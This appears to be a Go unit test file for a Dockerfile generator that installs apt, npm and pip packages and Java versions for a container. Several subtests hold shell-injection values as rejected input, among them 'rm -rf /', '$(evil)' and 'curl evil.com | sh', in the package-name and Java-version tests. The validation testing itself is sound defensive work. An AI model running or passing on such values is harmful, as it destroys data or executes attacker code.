package image

import (
	"strings"
	"testing"
)

func TestGenerateProjectDockerfile(t *testing.T) {
	t.Run("unknown key rejected", func(t *testing.T) {
		_, err := generateProjectDockerfile("", map[string][]string{"bad": {"x"}}, "")
		if err == nil {
			t.Error("expected error for unknown package type")
		}
	})

	t.Run("apt packages", func(t *testing.T) {
		df, err := generateProjectDockerfile("", map[string][]string{
			"apt": {"curl", "jq"},
		}, "")
		if err != nil {
			t.Fatal(err)
		}
		if !strings.Contains(df, "USER root") {
			t.Error("missing USER root for apt")
		}
		if !strings.Contains(df, "apt-get install") {
			t.Error("missing apt-get install")
		}
		if !strings.Contains(df, "curl") || !strings.Contains(df, "jq") {
			t.Error("missing package names")
		}
		if !strings.HasSuffix(strings.TrimSpace(df), "USER claude") {
			t.Error("should end with USER claude")
		}
	})

	t.Run("npm packages", func(t *testing.T) {
		df, err := generateProjectDockerfile("", map[string][]string{
			"npm": {"typescript", "eslint"},
		}, "")
		if err != nil {
			t.Fatal(err)
		}
		if !strings.Contains(df, "npm install -g") {
			t.Error("missing npm install -g")
		}
		if !strings.Contains(df, "typescript") || !strings.Contains(df, "eslint") {
			t.Error("missing npm package names")
		}
	})

	t.Run("pip packages each get own RUN", func(t *testing.T) {
		df, err := generateProjectDockerfile("", map[string][]string{
			"pip": {"ruff", "black"},
		}, "")
		if err != nil {
			t.Fatal(err)
		}
		ruffCount := strings.Count(df, "uv tool install ruff")
		blackCount := strings.Count(df, "uv tool install black")
		if ruffCount != 1 {
			t.Errorf("expected 1 uv tool install ruff, got %d", ruffCount)
		}
		if blackCount != 1 {
			t.Errorf("expected 1 uv tool install black, got %d", blackCount)
		}
		// Ensure they are separate RUN commands, not joined
		if strings.Contains(df, "uv tool install ruff black") || strings.Contains(df, "uv tool install black ruff") {
			t.Error("pip packages should not be joined in one invocation")
		}
	})

	t.Run("run commands emitted as-is", func(t *testing.T) {
		df, err := generateProjectDockerfile("", map[string][]string{
			"run": {"echo hello", "echo world"},
		}, "")
		if err != nil {
			t.Fatal(err)
		}
		if !strings.Contains(df, "RUN echo hello") {
			t.Error("missing RUN echo hello")
		}
		if !strings.Contains(df, "RUN echo world") {
			t.Error("missing RUN echo world")
		}
	})

	t.Run("empty sub-lists produce no output for that type", func(t *testing.T) {
		df, err := generateProjectDockerfile("", map[string][]string{
			"apt": {},
			"npm": {"typescript"},
		}, "")
		if err != nil {
			t.Fatal(err)
		}
		if strings.Contains(df, "apt-get") {
			t.Error("empty apt list should not produce apt-get command")
		}
		if !strings.Contains(df, "npm install -g") {
			t.Error("npm should still be present")
		}
	})

	t.Run("always ends with USER claude", func(t *testing.T) {
		df, err := generateProjectDockerfile("", map[string][]string{
			"apt": {"curl"},
		}, "")
		if err != nil {
			t.Fatal(err)
		}
		if !strings.HasSuffix(strings.TrimSpace(df), "USER claude") {
			t.Errorf("dockerfile does not end with USER claude:\n%s", df)
		}
	})

	t.Run("apt package with shell operators rejected", func(t *testing.T) {
		bad := []string{
			"curl && echo pwned",
			"curl; rm -rf /",
			"curl\necho pwned",
			"curl$(evil)",
		}
		for _, name := range bad {
			_, err := generateProjectDockerfile("", map[string][]string{"apt": {name}}, "")
			if err == nil {
				t.Errorf("expected error for apt package name %q", name)
			}
		}
	})

	t.Run("npm package with shell operators rejected", func(t *testing.T) {
		bad := []string{
			"typescript && echo pwned",
			"typescript; rm -rf /",
		}
		for _, name := range bad {
			_, err := generateProjectDockerfile("", map[string][]string{"npm": {name}}, "")
			if err == nil {
				t.Errorf("expected error for npm package name %q", name)
			}
		}
	})

	t.Run("custom java version adds mise install", func(t *testing.T) {
		df, err := generateProjectDockerfile("", map[string][]string{}, "11")
		if err != nil {
			t.Fatal(err)
		}
		if !strings.Contains(df, "mise install java@11") {
			t.Error("missing mise install for custom java version")
		}
		if !strings.Contains(df, "mise use --global java@11") {
			t.Error("missing mise use for custom java version")
		}
		if !strings.Contains(df, "$HOME/.local/bin/mise") {
			t.Error("mise should use full path")
		}
	})

	t.Run("pre-installed java version skips mise install", func(t *testing.T) {
		df, err := generateProjectDockerfile("", map[string][]string{"apt": {"curl"}}, "21")
		if err != nil {
			t.Fatal(err)
		}
		if strings.Contains(df, "mise install") {
			t.Error("pre-installed java version should not add mise install")
		}
	})

	t.Run("custom java only triggers project image", func(t *testing.T) {
		df, err := generateProjectDockerfile("", map[string][]string{}, "11")
		if err != nil {
			t.Fatal(err)
		}
		if !strings.HasPrefix(df, "FROM asylum:latest") {
			t.Error("should start with FROM asylum:latest")
		}
	})

	t.Run("java version with shell injection rejected", func(t *testing.T) {
		bad := []string{
			"11 && curl evil.com | sh",
			"11; rm -rf /",
			"11$(evil)",
			"abc",
		}
		for _, ver := range bad {
			_, err := generateProjectDockerfile("", map[string][]string{}, ver)
			if err == nil {
				t.Errorf("expected error for java version %q", ver)
			}
		}
	})

	t.Run("valid java versions accepted", func(t *testing.T) {
		for _, ver := range []string{"11", "8.0.392", "11.0"} {
			_, err := generateProjectDockerfile("", map[string][]string{}, ver)
			if err != nil {
				t.Errorf("unexpected error for java version %q: %v", ver, err)
			}
		}
	})

	t.Run("pip package with shell operators rejected", func(t *testing.T) {
		bad := []string{
			"ruff; rm -rf /",
			"ruff && echo pwned",
			"ruff\necho pwned",
			"ruff$(evil)",
		}
		for _, name := range bad {
			_, err := generateProjectDockerfile("", map[string][]string{"pip": {name}}, "")
			if err == nil {
				t.Errorf("expected error for pip package name %q", name)
			}
		}
	})
}
